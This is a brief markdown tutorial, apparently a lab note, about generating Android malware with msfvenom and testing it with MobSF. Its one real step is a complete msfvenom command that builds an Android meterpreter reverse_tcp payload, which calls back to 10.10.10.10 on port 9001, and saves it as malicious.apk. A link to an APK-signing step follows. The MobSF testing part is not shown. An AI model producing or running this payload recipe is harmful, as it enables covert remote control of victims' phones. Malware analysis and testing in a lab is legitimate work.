# Generate and test android malware using MSfvenon & MobSF

## Generate Android payload (https://shell.anir0y.in/)

login to your kali linux machine, open terminal and type this command 

```bash
msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=10.10.10.10 lport=9001 R -o malicious.apk
```

it will generate a apk file. 

## addtional step [sign the apk file](singapk.md)


